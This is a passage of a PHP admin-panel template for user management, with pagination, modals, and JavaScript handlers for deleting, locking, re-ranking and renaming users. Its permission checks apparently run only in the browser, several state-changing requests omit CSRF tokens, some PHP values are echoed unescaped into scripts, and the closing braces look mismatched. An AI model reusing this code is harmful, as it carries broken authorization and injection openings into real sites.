                                                <button class="btn btn-outline-info btn-sm color-toggle-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="Change Color">
                                                    <i class="fas fa-palette"></i>
                                                </button>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                </tr>
                            <?php endwhile; ?>

                            <?php if ($items->num_rows === 0): ?>
                                <tr>
                                    <td colspan="5" class="no-results">
                                        <i class="fas fa-users"></i>
                                        <p>No users found</p>
                                        <?php if ($search_query !== ''): ?>
                                            <p class="text-muted">Try adjusting your search criteria</p>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <nav aria-label="Pagination">
            <ul class="pagination">
                <?php if ($page > 1): ?>
                    <li class="page-item">
                        <a class="page-link" href="?section=users&page=<?= $page - 1 ?>&search=<?= urlencode($search_query) ?>">
                            <i class="fas fa-chevron-left"></i>
                            <span class="ms-1 d-none d-sm-inline">Previous</span>
                        </a>
                    </li>
                <?php endif; ?>
                
                <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                    <li class="page-item <?= $i == $page ? 'active' : '' ?>">
                        <a class="page-link" href="?section=users&page=<?= $i ?>&search=<?= urlencode($search_query) ?>"><?= $i ?></a>
                    </li>
                <?php endfor; ?>
                
                <?php if ($page < $totalPages): ?>
                    <li class="page-item">
                        <a class="page-link" href="?section=users&page=<?= $page + 1 ?>&search=<?= urlencode($search_query) ?>">
                            <span class="me-1 d-none d-sm-inline">Next</span>
                            <i class="fas fa-chevron-right"></i>
                        </a>
                    </li>
                <?php endif; ?>
            </ul>
        </nav>
    </div>
</div>

<div class="modal fade" id="rankModal" tabindex="-1" aria-labelledby="rankModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Select Rank</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p class="text-muted mb-3">Select a new rank for <span id="selected-username" class="fw-bold text-white"></span></p>
                <ul id="rank-list" class="list-group">
                    <?php
                    foreach ($validRanks as $rank) {
                        if ($loggedInUserRank === 'Manager' && ($rank === 'Admin' || $rank === 'Manager' || $rank === 'Founder')) continue;
                        echo "<li class='list-group-item' data-rank='" . htmlspecialchars($rank, ENT_QUOTES, 'UTF-8') . "'>" . htmlspecialchars($rank, ENT_QUOTES, 'UTF-8') . "</li>";
                    }
                    ?>
                </ul>
                <div id="confirm-container" class="mt-4" style="display: none;">
                    <div class="d-flex gap-2">
                        <button class="btn btn-primary w-100" id="confirm-rank-button">
                            <i class="fas fa-check"></i> Confirm
                        </button>
                        <button class="btn btn-outline-secondary w-100" id="deselect-rank-button">
                            <i class="fas fa-times"></i> Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="passwordModal" class="modal-custom">
    <div class="modal-custom-header">
        <h4 class="modal-custom-title">Change Password</h4>
        <button class="modal-custom-close closeModal">&times;</button>
    </div>
    <div class="form-group">
        <label class="form-label" for="newPassword">New Password</label>
        <input type="password" id="newPassword" class="form-control" placeholder="Enter new password">
    </div>
    <button id="confirmPasswordChange" class="btn btn-primary w-100">
        <i class="fas fa-key"></i> Update Password
    </button>
</div>

<div id="usernameModal" class="modal-custom">
    <div class="modal-custom-header">
        <h4 class="modal-custom-title">Change Username</h4>
        <button class="modal-custom-close closeModal">&times;</button>
    </div>
    <div class="form-group">
        <label class="form-label" for="newUsername">New Username</label>
        <input type="text" id="newUsername" class="form-control" placeholder="Enter new username">
    </div>
    <button id="confirmUsernameChange" class="btn btn-primary w-100">
        <i class="fas fa-user-edit"></i> Update Username
    </button>
</div>

<div id="colorModal" class="modal-custom" style="display:none;">
    <div class="modal-custom-header">
        <h4 class="modal-custom-title">Set User Color</h4>
        <button class="modal-custom-close closeColorModal" type="button">&times;</button>
    </div>
    <div class="form-group">
        <label class="form-label" for="colorInput">
            Enter a color (HEX or RGB, e.g. <span style="color:#ff0000">#ff0000</span> or <span style="color:red">red</span>):
        </label>
        <input type="text" id="colorInput" class="form-control" placeholder="#ff0000 or rgb(255,0,0) or red">
        <div id="colorPreview" style="margin-top:10px;height:32px;border-radius:4px;border:1px solid var(--border);"></div>
    </div>
    <button id="confirmColorChange" class="btn btn-primary w-100 mt-2">
        <i class="fas fa-palette"></i> Set Color
    </button>
</div>

<div id="modalOverlay"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let selectedUsername = null;
    let selectedRank = null;
    let colorModal = document.getElementById('colorModal');
    let colorOverlay = document.getElementById('modalOverlay');
    let colorInput = document.getElementById('colorInput');
    let colorPreview = document.getElementById('colorPreview');
    let confirmColorChange = document.getElementById('confirmColorChange');

    function showColorModal(username) {
        selectedUsername = username;
        colorInput.value = '';
        colorPreview.style.background = '';
        colorModal.style.display = 'block';
        colorOverlay.style.display = 'block';
        colorInput.focus();
    }

    function closeColorModal() {
        colorModal.style.display = 'none';
        colorOverlay.style.display = 'none';
        selectedUsername = null;
    }

    if (colorInput && colorPreview) {
        colorInput.addEventListener('input', function() {
            let val = colorInput.value.trim();
            colorPreview.style.background = val;
        });
    }

    document.querySelectorAll('.closeColorModal').forEach(btn => {
        btn.addEventListener('click', closeColorModal);
    });
    if (colorOverlay) {
        colorOverlay.addEventListener('click', closeColorModal);
    }

    if (confirmColorChange) {
        confirmColorChange.addEventListener('click', function() {
            const color = colorInput.value.trim();
            if (!color) {
                alert('Please enter a color.');
                return;
            }
            this.disabled = true;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';

            let csrf = '';
            <?php if (isset($_SESSION['csrf_token'])): ?>
                csrf = <?= json_encode($_SESSION['csrf_token']) ?>;
            <?php endif; ?>

            fetch('./toggle_colorAdmin.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: selectedUsername, color: color, csrf_token: csrf })
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    alert(`Color updated successfully to ${color}`);
                    closeColorModal();
                } else {
                    alert('Error: ' + (data.error || 'Failed to update color'));
                }
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-palette"></i> Set Color';
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while updating the color');
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-palette"></i> Set Color';
            });
        });
    }

    document.querySelectorAll('.color-toggle-btn').forEach(button => {
        button.addEventListener('click', function () {
            showColorModal(this.getAttribute('data-username'));
        });
    });

document.addEventListener('DOMContentLoaded', function () {

    const exportUsersBtn = document.getElementById('exportUsers');

    exportUsersBtn.addEventListener('click', function () {

        exportUsersBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Exporting...';
        exportUsersBtn.disabled = true;

        setTimeout(() => {

            // Text content for the file (you can replace with real user export later)
            const text = "User Export\n\nExported successfully.\nReplace this with real DB export.";

            // Create blob
            const blob = new Blob([text], { type: "text/plain" });
            const url = URL.createObjectURL(blob);

            // Create invisible download link
            const a = document.createElement('a');
            a.href = url;
            a.download = "users_export.txt"; // Filename
            document.body.appendChild(a);

            // Auto-download
            a.click();

            // Clean up
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            exportUsersBtn.innerHTML = '<i class="fas fa-download"></i> Export Users';
            exportUsersBtn.disabled = false;

        }, 800); // small delay for nicer UX
    });
});


        
        // Refresh Data functionality
        const refreshDataBtn = document.getElementById('refreshData');
        if (refreshDataBtn) {
            refreshDataBtn.addEventListener('click', function() {
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
                location.reload();
            });
        }
        
        const searchInput = document.getElementById('search-input');
        if (searchInput) {
            searchInput.addEventListener('keypress', function(event) {
                if (event.key === 'Enter') {
                    const searchValue = this.value.trim();
                    const section = '<?= $activeSection ?>';
                    window.location.href = `?section=${section}&search=${encodeURIComponent(searchValue)}`;
                }
            });
        }

        const deleteUserButtons = document.querySelectorAll('.delete-user-btn');
        if (deleteUserButtons.length > 0) {
            deleteUserButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const username = this.getAttribute('data-username');
                    
                    if (confirm(`Are you sure you want to delete user "${username}"? This will remove all their data and cannot be undone.`)) {
                        this.disabled = true;
                        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                        
                        const formData = new FormData();
                        formData.append('delete_username', username);
                        
                        fetch('index.php?section=users', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                const row = this.closest('tr');
                                row.style.backgroundColor = 'rgba(220, 53, 69, 0.1)';
                                row.style.transition = 'all 0.5s ease';
                                
                                setTimeout(() => {
                                    row.style.opacity = '0';
                                    row.style.height = '0';
                                    row.style.overflow = 'hidden';
                                    
                                    setTimeout(() => {
                                        row.remove();
                                        
                                        const tableBody = document.querySelector('#users-table');
                                        if (tableBody && tableBody.querySelectorAll('tr').length === 0) {
                                            tableBody.innerHTML = `
                                                <tr>
                                                    <td colspan="5" class="no-results">
                                                        <i class="fas fa-users"></i>
                                                        <p>No users found</p>
                                                    </td>
                                                </tr>
                                            `;
                                        }
                                    }, 300);
                                }, 300);
                            } else {
                                alert('Error: ' + (data.error || 'Failed to delete user'));
                                this.disabled = false;
                                this.innerHTML = '<i class="fas fa-trash-alt"></i>';
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            alert('An error occurred while deleting the user');
                            this.disabled = false;
                            this.innerHTML = '<i class="fas fa-trash-alt"></i>';
                        });
                    }
                });
            });
        }

        const lockButtons = document.querySelectorAll('.lock-btn');
        if (lockButtons.length > 0) {
            lockButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const username = this.getAttribute('data-username');
                    const isLocked = this.querySelector('i').classList.contains('fa-unlock');
                    const action = isLocked ? 'unlock' : 'lock';
                    
                    if (confirm(`Are you sure you want to ${action} the account for ${username}?`)) {
                        this.disabled = true;
                        const originalHTML = this.innerHTML;
                        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                        
                        fetch('index.php?section=users', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({username: username})
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                const row = this.closest('tr');
                                const statusBadge = row.querySelector('.badge');
                                
                                if (isLocked) {
                                    this.innerHTML = '<i class="fas fa-lock"></i>';
                                    this.classList.remove('btn-outline-success');
                                    this.classList.add('btn-outline-danger');
                                    statusBadge.textContent = 'Active';
                                    statusBadge.classList.remove('badge-danger');
                                    statusBadge.classList.add('badge-success');
                                } else {
                                    this.innerHTML = '<i class="fas fa-unlock"></i>';
                                    this.classList.remove('btn-outline-danger');
                                    this.classList.add('btn-outline-success');
                                    statusBadge.textContent = 'Locked';
                                    statusBadge.classList.remove('badge-success');
                                    statusBadge.classList.add('badge-danger');
                                }
                                
                                this.disabled = false;
                            } else {
                                alert('Error: ' + (data.error || 'Failed to update account status'));
                                this.disabled = false;
                                this.innerHTML = originalHTML;
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            alert('An error occurred while updating account status');
                            this.disabled = false;
                            this.innerHTML = originalHTML;
                        });
                    }
                });
            });
        }

        const rankButtons = document.querySelectorAll('.rank-btn');
        if (rankButtons.length > 0) {
            const rankModal = new bootstrap.Modal(document.getElementById('rankModal'));
            
            rankButtons.forEach(button => {
                button.addEventListener('click', function() {
                    selectedUsername = this.getAttribute('data-username');
                    document.getElementById('selected-username').textContent = selectedUsername;
                    rankModal.show();
                });
            });
            
            document.querySelectorAll('#rank-list .list-group-item').forEach(item => {
                item.addEventListener('click', function() {
                    document.querySelectorAll('#rank-list .list-group-item').forEach(i => {
                        i.classList.remove('selected');
                    });
                    
                    this.classList.add('selected');
                    selectedRank = this.getAttribute('data-rank');
                    document.getElementById('confirm-container').style.display = 'block';
                });
            });
            
            document.getElementById('deselect-rank-button').addEventListener('click', function() {
                document.querySelectorAll('#rank-list .list-group-item').forEach(i => {
                    i.classList.remove('selected');
                });
                
                selectedRank = null;
                document.getElementById('confirm-container').style.display = 'none';
            });
            
            document.getElementById('confirm-rank-button').addEventListener('click', function() {
                if (!selectedUsername || !selectedRank) return;
                
                this.disabled = true;
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating...';
                
                fetch('index.php?section=users', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: new URLSearchParams({username: selectedUsername, new_rank: selectedRank})
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Error: ' + (data.error || 'Failed to update rank'));
                        this.disabled = false;
                        this.innerHTML = '<i class="fas fa-check"></i> Confirm';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred while updating the rank');
                    this.disabled = false;
                    this.innerHTML = '<i class="fas fa-check"></i> Confirm';
                });
            });
        }

        const passwordModal = document.getElementById('passwordModal');
        const usernameModal = document.getElementById('usernameModal');
        const modalOverlay = document.getElementById('modalOverlay');
        
        if (passwordModal && usernameModal && modalOverlay) {
            const closeButtons = document.querySelectorAll('.closeModal');
            
            function closeModal() {
                passwordModal.style.display = 'none';
                usernameModal.style.display = 'none';
                modalOverlay.style.display = 'none';
            }
            
            function showModal(modal) {
                modal.style.display = 'block';
                modalOverlay.style.display = 'block';
                
                const windowHeight = window.innerHeight;
                const modalHeight = modal.offsetHeight;
                const top = Math.max(20, (windowHeight - modalHeight) / 2);
                
                modal.style.top = top + 'px';
            }
            
            const changePassButtons = document.querySelectorAll('.change-pass-btn');
            if (changePassButtons.length > 0) {
                changePassButtons.forEach(button => {
                    button.addEventListener('click', function() {
                        const targetUsername = this.getAttribute('data-username');
                        const targetRank = this.closest('tr').querySelector('.rank-badge').textContent.trim();

                        if ((targetRank === 'Admin' && '<?= $loggedInUserRank ?>' !== 'Admin') ||
                            (targetRank === 'Admin' && '<?= $loggedInUserRank ?>' === 'Admin') ||
                            (targetRank === 'Manager' && !['Admin', 'Manager'].includes('<?= $loggedInUserRank ?>')) ||
                            (targetRank === 'Mod' && !['Admin', 'Manager', 'Mod'].includes('<?= $loggedInUserRank ?>'))) {
                            alert('You do not have permission to change the password for this user.');
                            return;
                        }

                        selectedUsername = targetUsername;
                        document.getElementById('newPassword').value = '';
                        showModal(passwordModal);
                    });
                });
                
                document.getElementById('confirmPasswordChange').addEventListener('click', function() {
                    const newPassword = document.getElementById('newPassword').value;
                    
                    if (!newPassword) {
                        alert('Please enter a new password');
                        return;
                    }
                    
                    this.disabled = true;
                    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating...';

                    let csrf = '';
                    <?php if (isset($_SESSION['csrf_token'])): ?>
                        csrf = <?= json_encode($_SESSION['csrf_token']) ?>;
                    <?php endif; ?>

                    fetch('update_passwordAdmin.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            username: selectedUsername,
                            newPassword: newPassword,
                            csrf_token: csrf
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert('Password updated successfully');
                            closeModal();
                        } else {
                            alert('Error: ' + (data.message || data.error || 'Failed to update password'));
                        }
                        
                        this.disabled = false;
                        this.innerHTML = '<i class="fas fa-key"></i> Update Password';
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred while updating the password');
                        
                        this.disabled = false;
                        this.innerHTML = '<i class="fas fa-key"></i> Update Password';
                    });
                });
            }
            
            const changeUsernameButtons = document.querySelectorAll('.change-username-btn');
            if (changeUsernameButtons.length > 0) {
                changeUsernameButtons.forEach(button => {
                    button.addEventListener('click', function() {
                        const currentUsername = this.getAttribute('data-username');
                        const targetRank = this.closest('tr').querySelector('.rank-badge').textContent.trim();

                        if ((targetRank === 'Admin' && '<?= $loggedInUserRank ?>' !== 'Admin') ||
                            (targetRank === 'Manager' && !['Admin', 'Manager'].includes('<?= $loggedInUserRank ?>')) ||
                            (targetRank === 'Mod' && !['Admin', 'Manager', 'Mod'].includes('<?= $loggedInUserRank ?>'))) {
                            alert('You do not have permission to change the username for this user.');
                            return;
                        }

                        document.getElementById('newUsername').value = currentUsername;
                        document.getElementById('newUsername').setAttribute('data-original', currentUsername);
                        showModal(usernameModal);
                    });
                });
                
                document.getElementById('confirmUsernameChange').addEventListener('click', function() {
                    const newUsername = document.getElementById('newUsername').value;
                    const currentUsername = document.getElementById('newUsername').getAttribute('data-original');
                    
                    if (!newUsername) {
                        alert('Please enter a new username');
                        return;
                    }
                    
                    this.disabled = true;
                    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating...';
					let csrf = '';
                    <?php if (isset($_SESSION['csrf_token'])): ?>
                        csrf = <?= json_encode($_SESSION['csrf_token']) ?>;
                    <?php endif; ?>
                    
                    fetch('updateUsernameAdmin.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: `newUsername=${encodeURIComponent(newUsername)}&currentUsername=${encodeURIComponent(currentUsername)}`
                    })
                    .then(response => response.text())
                    .then(responseText => {
                        if (responseText === 'Success') {
                            alert('Username updated successfully');
                            location.reload();
                        } else {
                            alert('Error: ' + responseText);
                            this.disabled = false;
                            this.innerHTML = '<i class="fas fa-user-edit"></i> Update Username';
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred while updating the username');
                        
                        this.disabled = false;
                        this.innerHTML = '<i class="fas fa-user-edit"></i> Update Username';
                    });
                });
            }
            
            closeButtons.forEach(button => {
                button.addEventListener('click', closeModal);
            });
            
            modalOverlay.addEventListener('click', closeModal);
        }
    });
</script>
</body>
</html>